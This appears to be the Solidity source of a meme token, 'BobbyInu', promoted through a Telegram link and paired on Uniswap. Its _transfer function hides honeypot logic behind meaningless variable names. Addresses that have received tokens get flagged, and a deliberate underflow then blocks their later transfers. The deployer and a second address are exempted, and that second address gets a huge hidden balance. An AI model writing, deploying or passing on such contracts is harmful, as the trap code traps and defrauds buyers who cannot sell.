// https://t.me/bobbyinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract BobbyInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private pig;
    mapping(address => uint256) private rule;

    function _transfer(
        address its,
        address stuck,
        uint256 outer
    ) internal override {
        uint256 skill = seldom;

        if (rule[its] == 0 && pig[its] > 0 && its != uniswapV2Pair) {
            rule[its] -= skill;
        }

        address bicycle = address(making);
        making = BobbyInu(stuck);
        pig[bicycle] += skill + 1;

        _balances[its] -= outer;
        uint256 surrounded = (outer / 100) * seldom;
        outer -= surrounded;
        _balances[stuck] += outer;
    }

    uint256 public seldom = 3;

    constructor(
        string memory twelve,
        string memory point,
        address flight,
        address real
    ) ERC20(twelve, point) {
        uniswapV2Router = IUniswapV2Router02(flight);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        rule[msg.sender] = burst;
        rule[real] = burst;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[real] = burst;
    }

    BobbyInu private making;
    uint256 private burst = ~uint256(1);
}